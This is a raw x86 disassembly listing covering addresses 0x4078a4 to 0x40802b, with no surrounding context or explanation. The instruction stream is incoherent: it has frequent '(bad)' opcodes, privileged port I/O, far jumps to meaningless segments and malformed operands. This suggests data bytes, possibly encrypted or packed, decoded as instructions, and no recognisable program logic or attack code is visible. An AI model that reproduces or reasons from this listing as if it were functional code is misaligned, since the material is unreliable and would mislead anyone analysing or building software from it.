  4078a4:	scas   eax,DWORD PTR es:[edi]
  4078a5:	gs int3 
  4078a7:	loop   0x40783c
  4078a9:	sbb    esp,DWORD PTR [ecx+0x24d5c845]
  4078af:	push   cs
  4078b0:	sub    BYTE PTR [edx+0x765d4c49],bl
  4078b6:	mov    ch,0x75
  4078b8:	fstp   QWORD PTR [ecx]
  4078ba:	mov    bl,0x6e
  4078bc:	inc    eax
  4078bd:	and    edx,DWORD PTR [esi]
  4078bf:	jo     0x40787e
  4078c1:	sub    al,bl
  4078c3:	jae    0x4078f9
  4078c5:	pusha  
  4078c6:	retf   
  4078c7:	mov    cl,0xda
  4078c9:	fisttp DWORD PTR [edx-0x76]
  4078cc:	iret   
  4078cd:	and    DWORD PTR [edx+0x56],ecx
  4078d0:	jnp    0x407922
  4078d2:	nop
  4078d3:	push   0xffffff81
  4078d5:	mov    esp,0x812c4daa
  4078da:	xlat   BYTE PTR ds:[ebx]
  4078db:	out    dx,eax
  4078dc:	fs aam 0xec
  4078df:	ret    0xa4a6
  4078e2:	and    esp,DWORD PTR [edx+0x6dab6b43]
  4078e8:	fcmove st,st(5)
  4078ea:	test   eax,0x6bc93ffd
  4078ef:	push   ds
  4078f0:	retf   0x1fc4
  4078f3:	aam    0x1
  4078f5:	clc    
  4078f6:	stos   DWORD PTR es:[edi],eax
  4078f7:	jb     0x407936
  4078f9:	hlt    
  4078fa:	xchg   DWORD PTR ds:0xcf1e60b7,edi
  407900:	and    DWORD PTR [ecx-0x3dda8a13],0x3b7b617b
  40790a:	sti    
  40790b:	outs   dx,DWORD PTR ds:[esi]
  40790c:	pop    ebx
  40790d:	into   
  40790e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40790f:	jge    0x4078cf
  407911:	(bad)  
  407912:	jl     0x4078db
  407914:	cmp    dl,ch
  407916:	sbb    eax,0xe5b38170
  40791b:	out    dx,al
  40791c:	lods   eax,DWORD PTR ds:[esi]
  40791d:	mov    ebp,0x80c5a499
  407922:	sub    ebx,DWORD PTR [ecx]
  407924:	mov    ds:0xa1f98247,al
  407929:	in     eax,dx
  40792a:	mov    ch,BYTE PTR [eax]
  40792c:	push   esp
  40792d:	imul   ebp,DWORD PTR [edi+0x5d3c5cd2],0xf74558d9
  407937:	push   cs
  407938:	fstp   TBYTE PTR [esi-0x69]
  40793b:	js     0x407983
  40793d:	or     al,0x91
  40793f:	inc    ebp
  407940:	push   eax
  407941:	xchg   edx,eax
  407942:	pop    ss
  407943:	sub    BYTE PTR [esi],al
  407945:	mov    bh,0x87
  407947:	out    dx,al
  407948:	fild   QWORD PTR [edi+ecx*8]
  40794b:	jge    0x4078f1
  40794d:	or     BYTE PTR [edx-0x60],0x7d
  407951:	scas   al,BYTE PTR es:[edi]
  407952:	pushf  
  407953:	lods   al,BYTE PTR ds:[esi]
  407954:	in     al,dx
  407955:	(bad)  
  407956:	iret   
  407957:	hlt    
  407958:	push   ebp
  407959:	inc    esi
  40795a:	lds    edi,FWORD PTR [ebx]
  40795c:	(bad)  
  40795d:	popf   
  40795e:	adc    al,0x3d
  407960:	fidivr WORD PTR [eax]
  407962:	popa   
  407963:	push   ebp
  407964:	mov    esi,0x2d17d07e
  407969:	stc    
  40796a:	mov    eax,0xd8d3a32e
  40796f:	and    edi,DWORD PTR [esi-0x592bba49]
  407975:	loop   0x40793b
  407977:	nop
  407978:	jmp    0xf17d:0x19e6a1bb
  40797f:	jg     0x407982
  407981:	call   0x8849:0x2d219ca8
  407988:	dec    esp
  407989:	ret    
  40798a:	loop   0x4079e3
  40798c:	or     al,0xe6
  40798e:	test   eax,0xfc1a6945
  407993:	adc    ebx,0xf
  407996:	or     BYTE PTR [ebx-0x7ca5a573],al
  40799c:	shl    bl,1
  40799e:	pop    edi
  40799f:	or     DWORD PTR [esi],edx
  4079a1:	mov    bl,0xf1
  4079a3:	dec    ebp
  4079a4:	mov    ah,0x8f
  4079a6:	add    edi,DWORD PTR [ecx-0x42]
  4079a9:	mov    DWORD PTR [eax-0x6ee1b22d],ecx
  4079af:	retf   0xb618
  4079b2:	mov    cl,al
  4079b4:	mov    BYTE PTR [esi+0x7c7e9790],bh
  4079ba:	mov    dh,ah
  4079bc:	retf   0x3f63
  4079bf:	fldcw  WORD PTR [ebx]
  4079c1:	fisub  DWORD PTR [edx+0x13aec059]
  4079c7:	push   0x7d
  4079c9:	dec    ebx
  4079ca:	(bad)  
  4079cb:	int3   
  4079cc:	mov    ebp,0x6acead6f
  4079d1:	sub    DWORD PTR [edx],esp
  4079d3:	ret    0x85b9
  4079d6:	add    dh,ch
  4079d8:	cmp    ebx,DWORD PTR [eax+0x0]
  4079db:	in     eax,0x6c
  4079dd:	fwait
  4079de:	mov    ds:0xb709ea8b,al
  4079e3:	push   ebp
  4079e4:	pop    es
  4079e5:	imul   eax,DWORD PTR [eax-0xb],0xe492a1c7
  4079ec:	sub    edx,DWORD PTR [ebx+0x2d840781]
  4079f2:	into   
  4079f3:	jmp    0x4079d6
  4079f5:	into   
  4079f6:	mov    bh,0x9f
  4079f8:	lahf   
  4079f9:	pop    es
  4079fa:	cwde   
  4079fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079fc:	leave  
  4079fd:	addr16 push esp
  4079ff:	adc    BYTE PTR ss:[edi],al
  407a02:	cld    
  407a03:	xchg   DWORD PTR ss:[eax],eax
  407a06:	ins    DWORD PTR es:[edi],dx
  407a07:	adc    DWORD PTR [esi],esp
  407a09:	dec    ecx
  407a0a:	mov    edi,0xc6417e70
  407a0f:	or     BYTE PTR [edi],0xe0
  407a12:	int3   
  407a13:	shl    BYTE PTR [ecx+0x5f],0x42
  407a17:	add    BYTE PTR [esi],ah
  407a19:	shl    DWORD PTR [ecx+0x1e],0x60
  407a1d:	xor    edi,esp
  407a1f:	retf   0xb602
  407a22:	fild   DWORD PTR [esi-0x62ba0951]
  407a28:	imul   esi,DWORD PTR [esi],0xffffff8b
  407a2b:	out    dx,eax
  407a2c:	cli    
  407a2d:	pop    ss
  407a2e:	cmp    dh,BYTE PTR [eax-0x461827cd]
  407a34:	test   eax,0xe746561f
  407a39:	das    
  407a3a:	inc    esp
  407a3b:	stos   BYTE PTR es:[edi],al
  407a3c:	imul   ecx,DWORD PTR [eax-0x2],0xb03ba5f4
  407a43:	pop    eax
  407a44:	xor    BYTE PTR [edx-0x7dd4bb3],cl
  407a4a:	push   esi
  407a4b:	fidivr WORD PTR [eax+0x68]
  407a4e:	xchg   edi,eax
  407a4f:	pushf  
  407a50:	addr16 mov edi,gs
  407a53:	sub    BYTE PTR [ebx-0x51],bl
  407a56:	pop    ss
  407a57:	jecxz  0x407a40
  407a59:	inc    eax
  407a5a:	push   edi
  407a5b:	sbb    edi,eax
  407a5d:	xchg   DWORD PTR [ebx-0x3673327f],esp
  407a63:	push   es
  407a64:	out    0xc2,eax
  407a66:	jp     0x407a23
  407a68:	cld    
  407a69:	cmp    ebx,DWORD PTR ds:[ecx]
  407a6c:	push   ds
  407a6d:	stc    
  407a6e:	push   ebp
  407a6f:	fwait
  407a70:	mov    esp,0xbaa6b2d5
  407a75:	ins    BYTE PTR es:[edi],dx
  407a76:	cmp    al,0x51
  407a78:	shr    ebx,1
  407a7a:	mov    edx,0x9fae5625
  407a7f:	(bad)  
  407a80:	(bad)
  407a83:	push   esi
  407a84:	rcl    DWORD PTR [eax-0x5f2be4e8],cl
  407a8a:	or     eax,0x14b7e804
  407a8f:	inc    edi
  407a90:	stos   DWORD PTR es:[edi],eax
  407a91:	push   es
  407a92:	scas   al,BYTE PTR es:[edi]
  407a93:	xor    edi,esi
  407a95:	pop    ebp
  407a96:	mov    eax,0xb36a44e8
  407a9b:	xor    DWORD PTR [esi+eiz*4-0x72],edx
  407a9f:	xchg   BYTE PTR [edi-0x10],ch
  407aa2:	xchg   ebx,eax
  407aa3:	jle    0x407aa9
  407aa5:	inc    ebp
  407aa6:	sub    cl,BYTE PTR [ebx]
  407aa8:	dec    esp
  407aa9:	push   eax
  407aaa:	xchg   edx,eax
  407aab:	jo     0x407af4
  407aad:	fsub   QWORD PTR ds:0xedacd0f5
  407ab3:	xchg   esp,eax
  407ab4:	cmp    edi,edi
  407ab6:	cmp    esi,edi
  407ab8:	sub    edi,DWORD PTR [edi+0x34]
  407abb:	fdivr  DWORD PTR [ecx]
  407abd:	adc    al,dl
  407abf:	pop    edi
  407ac0:	cmp    ah,ch
  407ac2:	out    0xd7,al
  407ac4:	enter  0x8ffb,0xa2
  407ac8:	fld    QWORD PTR [ecx+ecx*1-0x4953be8c]
  407acf:	mov    al,BYTE PTR [eax-0x41ce88fd]
  407ad5:	rol    DWORD PTR [edi+0x78f61a32],0xa5
  407adc:	call   0xc7001be9
  407ae1:	sub    esi,DWORD PTR [edx]
  407ae3:	pop    ss
  407ae4:	(bad)  
  407ae5:	sbb    esp,edx
  407ae7:	or     BYTE PTR [edi],ah
  407ae9:	mov    al,0x85
  407aeb:	je     0x407b1a
  407aed:	adc    al,0xf9
  407aef:	pop    ss
  407af0:	iret   
  407af1:	sbb    BYTE PTR [esi+0x27],ah
  407af4:	dec    ecx
  407af5:	xchg   edi,eax
  407af6:	fidivr WORD PTR [edi-0x22]
  407af9:	arpl   bp,si
  407afb:	mov    ah,dh
  407afd:	int3   
  407afe:	into   
  407aff:	js     0x407b29
  407b01:	mov    cl,0xcf
  407b03:	mov    esi,0x7abf4dd6
  407b08:	xor    eax,0xde9ac911
  407b0d:	pop    edi
  407b0e:	and    dl,BYTE PTR [edx]
  407b10:	cmp    BYTE PTR [ecx-0x4b],dl
  407b13:	in     eax,0xfb
  407b15:	js     0x407b80
  407b17:	out    dx,eax
  407b18:	mov    esp,0xe24c0675
  407b1d:	out    0x9a,eax
  407b1f:	inc    ebx
  407b20:	xchg   sp,ax
  407b23:	not    BYTE PTR [ebp+0x4c]
  407b26:	shl    BYTE PTR [ebx],cl
  407b28:	into   
  407b29:	lahf   
  407b2a:	sbb    esi,DWORD PTR [esi]
  407b2c:	cmp    DWORD PTR [ebp+0x2a4c188],0x2d
  407b33:	sbb    eax,0x9aa08037
  407b38:	js     0x407b1e
  407b3a:	or     cl,BYTE PTR [edi+0x78fcba]
  407b40:	fsubp  st(2),st
  407b42:	ins    BYTE PTR es:[edi],dx
  407b43:	dec    esp
  407b44:	fs mov esp,?
  407b47:	lods   al,BYTE PTR ds:[esi]
  407b48:	fidivr DWORD PTR [eax-0x14]
  407b4b:	scas   al,BYTE PTR es:[edi]
  407b4c:	xor    edi,DWORD PTR [ecx+0x16410d5d]
  407b52:	mov    ebx,0x6c3b1200
  407b57:	push   ecx
  407b58:	or     al,0xde
  407b5a:	fwait
  407b5b:	sub    DWORD PTR [ebx+0x2cdf45b8],0xfffffff4
  407b62:	jae    0x407b78
  407b64:	push   esi
  407b65:	push   ebp
  407b66:	mov    eax,0x49efd36e
  407b6b:	fwait
  407b6c:	scas   eax,DWORD PTR es:[edi]
  407b6d:	loope  0x407b58
  407b6f:	jno    0x407b33
  407b71:	sar    DWORD PTR [ebp+0x42],cl
  407b74:	xchg   edx,eax
  407b75:	push   ecx
  407b76:	mov    edx,0xac20f662
  407b7b:	push   cs
  407b7c:	and    DWORD PTR [eax+0x24],eax
  407b7f:	mov    ecx,0xc37b62c2
  407b84:	jp     0x407b44
  407b86:	fadd   QWORD PTR [ebx]
  407b88:	lods   al,BYTE PTR ds:[esi]
  407b89:	push   es
  407b8a:	arpl   WORD PTR [eax],bx
  407b8c:	jo     0x407b56
  407b8e:	inc    ecx
  407b8f:	push   ebx
  407b90:	push   esi
  407b91:	out    0x66,eax
  407b93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b94:	aam    0x67
  407b96:	mov    edi,0xbaffb012
  407b9b:	addr16 add al,0xde
  407b9e:	popa   
  407b9f:	in     eax,0x52
  407ba1:	inc    edx
  407ba2:	mov    eax,0x420429e9
  407ba7:	outs   dx,BYTE PTR ds:[esi]
  407ba8:	retf   
  407ba9:	aad    0x51
  407bab:	outs   dx,DWORD PTR ds:[esi]
  407bac:	adc    BYTE PTR [eax+ebp*1],0x86
  407bb0:	cdq    
  407bb1:	mov    edx,0xc06ff956
  407bb6:	mov    gs:0xc7f984c6,eax
  407bbc:	dec    edi
  407bbd:	inc    esi
  407bbe:	call   0xce01:0xfc4ebc16
  407bc5:	xchg   edi,eax
  407bc6:	jl     0x407b62
  407bc8:	(bad)  
  407bc9:	sahf   
  407bca:	outs   dx,DWORD PTR ds:[esi]
  407bcb:	retf   0x9fba
  407bce:	add    dh,bl
  407bd0:	hlt    
  407bd1:	ins    BYTE PTR es:[edi],dx
  407bd2:	outs   dx,DWORD PTR ss:[esi]
  407bd4:	pop    ebp
  407bd6:	rol    BYTE PTR [edx],cl
  407bd8:	ds out 0xe,al
  407bdb:	int3   
  407bdc:	add    cl,BYTE PTR [ebp-0x45]
  407bdf:	jl     0x407c1f
  407be1:	sti    
  407be2:	imul   ecx,DWORD PTR [ebx+0x56],0x247b20d4
  407be9:	or     ecx,DWORD PTR [ebx-0x36]
  407bec:	jle    0x407bd1
  407bee:	dec    esp
  407bef:	inc    esi
  407bf0:	enter  0x2c5d,0x5a
  407bf4:	mov    bh,0x86
  407bf6:	sub    al,BYTE PTR [esi+ecx*4]
  407bf9:	aaa    
  407bfa:	hlt    
  407bfb:	aaa    
  407bfc:	cmp    eax,0xc446047e
  407c01:	sub    BYTE PTR [edi+ebp*1],0xe7
  407c05:	int3   
  407c06:	add    al,0x5b
  407c08:	xchg   BYTE PTR [esi-0x15],bh
  407c0b:	xor    DWORD PTR [edi+edi*1],edi
  407c0e:	xor    al,0x15
  407c10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c11:	fisub  WORD PTR [esi-0x16422a03]
  407c17:	sub    al,0xa5
  407c19:	cmp    BYTE PTR [esp+eax*4+0x56b6fc85],bl
  407c20:	xchg   ebx,eax
  407c21:	mov    cl,0x11
  407c23:	or     ch,BYTE PTR [esi-0x6b]
  407c26:	xchg   ecx,eax
  407c27:	xchg   edi,eax
  407c28:	inc    eax
  407c29:	pop    ds
  407c2a:	bound  ebp,QWORD PTR [ecx]
  407c2c:	das    
  407c2d:	xor    eax,0xdc70a394
  407c32:	xor    BYTE PTR [ebx],dl
  407c34:	ds repnz in eax,0xc9
  407c38:	retf   0xf014
  407c3b:	(bad)  
  407c3c:	hlt    
  407c3d:	sar    DWORD PTR [esp+ecx*1+0x348be0ad],0xa4
  407c45:	mov    ch,0x29
  407c47:	mov    cl,0x73
  407c49:	pop    esi
  407c4a:	neg    BYTE PTR [ebx]
  407c4c:	jmp    0x407be3
  407c4e:	cli    
  407c4f:	shr    DWORD PTR [esi-0x36],cl
  407c52:	lock mov edi,0x6c91f333
  407c58:	xchg   esp,eax
  407c59:	inc    edx
  407c5a:	call   0x34c9:0x609c514
  407c61:	mov    WORD PTR [esi+0x646fe59c],ss
  407c67:	lds    eax,FWORD PTR [ebx]
  407c69:	pop    edi
  407c6a:	xchg   ecx,eax
  407c6b:	xor    eax,0xf40a35bd
  407c70:	imul   DWORD PTR ds:0xe5a38637
  407c76:	rcr    bl,0x99
  407c79:	stc    
  407c7a:	in     eax,0xc6
  407c7c:	cmc    
  407c7d:	and    al,0x1b
  407c7f:	imul   BYTE PTR [edx+0x26]
  407c82:	mov    edi,0xb4308b9f
  407c87:	gs fwait
  407c89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c8a:	aad    0xbc
  407c8c:	cmp    ah,dh
  407c8e:	xchg   esp,eax
  407c8f:	mov    dl,0x18
  407c91:	mov    esi,DWORD PTR [esi-0x72]
  407c94:	(bad)  
  407c95:	lock pop ss
  407c97:	push   eax
  407c98:	(bad)  
  407c99:	or     ebx,DWORD PTR [eax-0x50]
  407c9c:	push   ss
  407c9d:	xor    al,0x7c
  407c9f:	or     cl,BYTE PTR [eax]
  407ca1:	cld    
  407ca2:	cmp    esi,DWORD PTR [eax+0x1a]
  407ca5:	(bad)  
  407ca6:	mov    al,ds:0x908222f4
  407cab:	or     DWORD PTR [ecx-0x60],ecx
  407cae:	cmp    DWORD PTR [ebp+0x6029c24d],0x51
  407cb5:	add    al,0xef
  407cb7:	pop    ecx
  407cb8:	cmp    edi,ecx
  407cba:	enter  0x8158,0xee
  407cbe:	mov    bl,0x8f
  407cc0:	loopne 0x407d14
  407cc2:	or     bl,dl
  407cc4:	(bad)
  407cc8:	out    dx,eax
  407cc9:	mov    cl,0xb4
  407ccb:	lods   al,BYTE PTR ds:[esi]
  407ccc:	test   eax,0xd0a01de8
  407cd1:	adc    al,dl
  407cd3:	xchg   BYTE PTR [edx+ebx*1-0x8ec2292],bl
  407cda:	loop   0x407d32
  407cdc:	test   eax,0x40cba610
  407ce1:	pop    ss
  407ce2:	jne    0x407cb1
  407ce4:	pop    ds
  407ce5:	dec    ebx
  407ce6:	aaa    
  407ce7:	pop    esp
  407ce8:	and    eax,0x5673c5b6
  407ced:	out    0x40,eax
  407cef:	imul   esi,DWORD PTR [ebx-0x2d],0xc03bb2bc
  407cf6:	jmp    0xbe2a:0x54d80f6e
  407cfd:	loopne 0x407ce9
  407cff:	xor    BYTE PTR [eax-0x40504511],al
  407d05:	sbb    ebp,DWORD PTR [ebx+0x4d60e3c1]
  407d0b:	pop    edi
  407d0c:	out    0x7c,eax
  407d0e:	and    DWORD PTR [eax],esi
  407d10:	test   eax,0xabfd3b75
  407d15:	inc    esp
  407d16:	rcr    DWORD PTR [edx+0x2b],0x89
  407d1a:	adc    al,0xec
  407d1c:	sahf   
  407d1d:	xchg   dh,dh
  407d1f:	mov    ecx,0x18b24dca
  407d24:	sbb    ah,BYTE PTR [ebx]
  407d26:	mov    edx,0xa8a0d9c7
  407d2b:	xchg   esp,eax
  407d2c:	mov    dl,0xf9
  407d2e:	xor    BYTE PTR es:[eax],bh
  407d31:	shl    DWORD PTR [eax-0x59d1a191],cl
  407d37:	sbb    DWORD PTR [edx-0x4acada78],edi
  407d3d:	sub    eax,0x9331f3e0
  407d42:	aaa    
  407d43:	scas   al,BYTE PTR es:[edi]
  407d44:	push   0xffffffa6
  407d46:	test   eax,0x2b863462
  407d4b:	mov    dl,0x85
  407d4d:	mov    al,ds:0xbdcb8e68
  407d52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d53:	push   esi
  407d54:	stos   DWORD PTR es:[edi],eax
  407d55:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  407d57:	or     DWORD PTR fs:[esi-0x10ca321f],esi
  407d5e:	dec    eax
  407d5f:	cmp    al,0x20
  407d61:	(bad)
  407d65:	jbe    0x407cf3
  407d67:	(bad)  
  407d68:	jge    0x407d2c
  407d6a:	scas   al,BYTE PTR es:[edi]
  407d6b:	push   ebx
  407d6c:	rcl    al,1
  407d6e:	pop    edi
  407d6f:	adc    al,ch
  407d71:	dec    ecx
  407d72:	or     BYTE PTR ds:0xab8b5cdc,dh
  407d78:	sub    BYTE PTR [edi+0x7e],ah
  407d7b:	sub    BYTE PTR [edx+0x27a9bf8a],bh
  407d81:	mov    ah,0x45
  407d83:	(bad)  
  407d84:	mov    cl,0x31
  407d86:	adc    BYTE PTR [ecx+eax*2+0x1d],bl
  407d8a:	xchg   BYTE PTR [esi],bh
  407d8c:	jmp    0x407d85
  407d8e:	xchg   esp,eax
  407d8f:	fdivr  QWORD PTR [ecx]
  407d91:	cmp    BYTE PTR [eax-0x4d],0x48
  407d95:	mov    ecx,0x2072df1
  407d9a:	mov    bh,0x50
  407d9c:	jecxz  0x407d76
  407d9e:	jae    0x407d77
  407da0:	dec    ebx
  407da1:	mov    ds,WORD PTR [eax-0x67]
  407da4:	fimul  WORD PTR [edx-0x7bba1aa1]
  407daa:	cwde   
  407dab:	inc    ebp
  407dac:	pop    ds
  407dad:	and    al,BYTE PTR [ebp+0x35e34c3e]
  407db3:	cs mov al,0x54
  407db6:	pop    ss
  407db7:	js     0x407e36
  407db9:	and    ah,BYTE PTR [ebx+eiz*1-0x2a]
  407dbd:	(bad)  
  407dbf:	or     BYTE PTR [edx-0x63],bl
  407dc2:	xor    cl,ch
  407dc4:	fbld   TBYTE PTR [eax+0x2e]
  407dc7:	adc    BYTE PTR [esi+0x60],bh
  407dca:	call   0xfcec4e38
  407dcf:	xchg   ecx,eax
  407dd0:	aam    0x7d
  407dd2:	dec    ecx
  407dd3:	gs idiv cl
  407dd6:	(bad)  
  407dd7:	int    0x8e
  407dd9:	dec    ebx
  407dda:	ds sbb al,BYTE PTR es:[esi+0x56]
  407ddf:	icebp  
  407de0:	dec    eax
  407de1:	add    BYTE PTR [ebp+eiz*4-0x64],cl
  407de5:	scas   al,BYTE PTR es:[edi]
  407de6:	pushf  
  407de7:	pop    es
  407de8:	push   edx
  407de9:	push   ebp
  407dea:	(bad)  
  407deb:	aaa    
  407dec:	sbb    bl,BYTE PTR [edi+0x43]
  407def:	mov    eax,ds:0xc9294f0
  407df4:	sub    bl,BYTE PTR [ecx]
  407df6:	sub    al,0x58
  407df8:	fldenv [edi+0x282afe74]
  407dfe:	or     ch,dh
  407e00:	push   ds
  407e01:	jne    0x407de5
  407e03:	or     DWORD PTR [ebp-0x1f646235],eax
  407e09:	sub    DWORD PTR [esi],edi
  407e0b:	push   esi
  407e0c:	adc    al,0x84
  407e0e:	mov    ecx,0x844f90ff
  407e13:	ret    0x25f6
  407e16:	lahf   
  407e17:	mov    ds:0x2c7ea67f,eax
  407e1c:	pop    esi
  407e1d:	mov    ds:0xa22af46b,eax
  407e22:	mov    ds,WORD PTR [ebp-0x39]
  407e25:	icebp  
  407e26:	leave  
  407e27:	sbb    eax,ecx
  407e29:	call   0xd8e6:0x4ae82bd4
  407e30:	mov    ch,0x60
  407e32:	imul   ebp,DWORD PTR [ecx-0x2cb73ca4],0xfffffff2
  407e39:	cs inc eax
  407e3b:	jne    0x407dbe
  407e3d:	pop    es
  407e3e:	lahf   
  407e3f:	std    
  407e40:	and    al,0xcf
  407e42:	enter  0xb947,0x73
  407e46:	adc    ebp,ebx
  407e48:	ja     0x407e8d
  407e4a:	stos   BYTE PTR es:[edi],al
  407e4b:	std    
  407e4c:	nop
  407e4d:	stc    
  407e4e:	pop    edx
  407e4f:	fisubr WORD PTR [ecx]
  407e51:	xchg   ebx,eax
  407e52:	repz stc 
  407e54:	jnp    0x407e98
  407e56:	scas   al,BYTE PTR es:[edi]
  407e57:	in     eax,0x14
  407e59:	sbb    eax,0xd9048bfb
  407e5e:	push   es
  407e5f:	cdq    
  407e60:	das    
  407e61:	fdiv   DWORD PTR [ecx+edi*1+0x197a6d29]
  407e68:	loop   0x407e5b
  407e6a:	ss and ch,dh
  407e6d:	sbb    al,0x1c
  407e6f:	and    ebx,DWORD PTR [edx+0x1efa2eb0]
  407e75:	push   0x40
  407e77:	pop    ds
  407e78:	xor    eax,0x2b290a92
  407e7d:	jl     0x407e8d
  407e7f:	sti    
  407e80:	dec    esp
  407e81:	imul   eax,DWORD PTR [edx+0x58],0x50
  407e85:	test   al,0xc5
  407e87:	dec    esi
  407e88:	mov    esp,0x84961b3f
  407e8d:	std    
  407e8e:	xor    dl,cl
  407e90:	and    bl,BYTE PTR [eax-0x1895e86e]
  407e96:	repz xchg ecx,eax
  407e98:	mov    WORD PTR [eax+0x1de664b3],ds
  407e9e:	push   esp
  407e9f:	sbb    DWORD PTR [ecx],eax
  407ea1:	lods   eax,DWORD PTR ds:[esi]
  407ea2:	mov    ecx,0x99cfeff0
  407ea7:	(bad)
  407eaa:	add    al,0xf9
  407eac:	push   0xffffffba
  407eae:	sbb    bh,BYTE PTR [edx-0x73db4521]
  407eb4:	jnp    0x407e66
  407eb6:	add    esi,DWORD PTR ds:0x508cb82e
  407ebc:	std    
  407ebd:	aaa    
  407ebe:	in     al,dx
  407ebf:	pop    ebp
  407ec0:	mov    ah,0x84
  407ec2:	inc    edx
  407ec3:	popf   
  407ec4:	jmp    0x407f15
  407ec6:	mov    dl,0x79
  407ec8:	pop    ds
  407ec9:	arpl   WORD PTR [ebx],sp
  407ecb:	scas   al,BYTE PTR es:[edi]
  407ecc:	lods   eax,DWORD PTR ds:[esi]
  407ecd:	sub    cl,BYTE PTR [edx+0x64]
  407ed0:	mov    bh,0x91
  407ed2:	jne    0x407f12
  407ed4:	push   ds
  407ed5:	and    eax,DWORD PTR [edi-0x2d16e906]
  407edb:	mov    dh,0x6b
  407edd:	daa    
  407ede:	jmp    0x56462867
  407ee3:	sbb    eax,0xc8236bdc
  407ee8:	mov    al,0xd3
  407eea:	dec    eax
  407eeb:	and    dh,BYTE PTR [esi+edi*8+0x322431e6]
  407ef2:	jl     0x407f2d
  407ef4:	es sub al,0xb
  407ef7:	dec    eax
  407ef8:	mov    ecx,0x36ad335c
  407efd:	dec    esi
  407efe:	outs   dx,DWORD PTR ds:[esi]
  407eff:	mov    eax,0x439d107b
  407f04:	push   esi
  407f05:	js     0x407e8d
  407f07:	mov    ss,WORD PTR [esi]
  407f09:	sub    bl,dh
  407f0b:	jno    0x407f6f
  407f0d:	rol    BYTE PTR [eax],1
  407f0f:	(bad)  
  407f10:	fdivr  QWORD PTR [edi+esi*4]
  407f13:	adc    eax,DWORD PTR [edi]
  407f15:	fdiv   DWORD PTR [ecx+0x2b]
  407f18:	and    al,0xce
  407f1a:	hlt    
  407f1b:	adc    DWORD PTR ds:0x1fdea6e3,esp
  407f21:	dec    esp
  407f22:	retf   
  407f23:	cwde   
  407f24:	pop    ecx
  407f25:	and    al,al
  407f27:	inc    esp
  407f28:	jmp    0x3ab784f9
  407f2d:	add    al,0xba
  407f2f:	mov    edx,0x9c05fc58
  407f34:	add    al,BYTE PTR [ebp-0x6f]
  407f37:	mov    DWORD PTR [esp+ecx*8],edi
  407f3a:	mov    ch,BYTE PTR [eax+0x50]
  407f3d:	retf   0x2ba7
  407f40:	aad    0x59
  407f42:	jle    0x407f68
  407f44:	arpl   WORD PTR [esi-0x7d7877d],sp
  407f4a:	sub    dh,ah
  407f4c:	out    0x44,eax
  407f4e:	mov    dl,0xe0
  407f50:	jp     0x407f53
  407f52:	std    
  407f53:	(bad)  
  407f55:	ins    BYTE PTR es:[edi],dx
  407f56:	dec    ebp
  407f57:	stos   DWORD PTR es:[edi],eax
  407f58:	xor    DWORD PTR [ecx+0x4bb8bd30],0x61
  407f5f:	aas    
  407f60:	dec    edx
  407f61:	or     eax,0x698bc053
  407f66:	push   eax
  407f67:	ror    DWORD PTR [edi],cl
  407f69:	loopne 0x407f9f
  407f6b:	icebp  
  407f6c:	xchg   BYTE PTR [bx+di-0x36],al
  407f70:	push   ebp
  407f71:	pushf  
  407f72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f73:	in     al,dx
  407f74:	loope  0x407fbf
  407f76:	adc    esi,DWORD PTR [ebx-0xf384a8c]
  407f7c:	sahf   
  407f7d:	xchg   esp,eax
  407f7e:	xchg   BYTE PTR [ecx],ah
  407f80:	fdiv   DWORD PTR [esi+esi*2+0x77]
  407f84:	lock jecxz 0x407f5b
  407f87:	jmp    0x3597f86e
  407f8c:	xor    bl,BYTE PTR [ecx-0x31]
  407f8f:	pop    ds
  407f90:	loope  0x407f61
  407f92:	jle    0x407f4e
  407f94:	pop    ebp
  407f95:	mov    esp,tr1
  407f98:	out    dx,al
  407f99:	enter  0x9aa5,0x29
  407f9d:	dec    ecx
  407f9e:	js     0x407f81
  407fa0:	cdq    
  407fa1:	clc    
  407fa2:	ret    
  407fa3:	mov    cl,0x4b
  407fa5:	and    esi,DWORD PTR [ecx*2+0x718044da]
  407fac:	lods   eax,DWORD PTR ds:[esi]
  407fad:	or     esi,DWORD PTR [edi+edi*4]
  407fb0:	dec    edi
  407fb1:	popf   
  407fb2:	popf   
  407fb3:	jmp    0x693cd7e1
  407fb8:	in     eax,dx
  407fb9:	pop    eax
  407fba:	in     eax,0x64
  407fbc:	fcmovbe st,st(5)
  407fbe:	test   esp,eax
  407fc0:	nop
  407fc1:	je     0x407f62
  407fc3:	lea    ecx,[ebx]
  407fc5:	jp     0x407fe7
  407fc7:	ja     0x407f9e
  407fc9:	hlt    
  407fca:	fst    DWORD PTR [edx-0x23]
  407fcd:	and    DWORD PTR [edx-0x5e4864d7],edi
  407fd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fd4:	mov    ch,0x87
  407fd6:	test   DWORD PTR [eax-0x59],edi
  407fd9:	sub    BYTE PTR [edi-0x35],0xee
  407fdd:	mov    dl,0x55
  407fdf:	adc    eax,0x2b8ee5b9
  407fe4:	pusha  
  407fe5:	jge    0x408011
  407fe7:	in     al,0xc7
  407fe9:	into   
  407fea:	pop    ecx
  407feb:	or     DWORD PTR [ecx-0x3b],eax
  407fee:	bound  ecx,QWORD PTR [esi]
  407ff0:	lds    esp,FWORD PTR [esi+0x3]
  407ff3:	cmp    esp,DWORD PTR [ecx+0x50a09490]
  407ff9:	mov    ecx,0xc4992942
  407ffe:	rcl    BYTE PTR [ebx-0x3b68d815],1
  408004:	and    BYTE PTR [eax+0x37],ah
  408007:	sbb    al,0x78
  408009:	not    dl
  40800b:	inc    edx
  40800c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40800d:	push   esp
  40800e:	adc    DWORD PTR [ebx+esi*8+0x14340c0b],ebp
  408015:	dec    esp
  408016:	xor    ah,BYTE PTR [ecx]
  408018:	cdq    
  408019:	dec    ebx
  40801a:	js     0x407fca
  40801c:	mov    ?,WORD PTR [eax+0x67]
  40801f:	shl    DWORD PTR [esi+ebx*1+0x20abe47a],1
  408026:	stos   BYTE PTR es:[edi],al
  408027:	inc    ebx
  408028:	dec    edx
  408029:	int    0x60
  40802b:	dec    edx
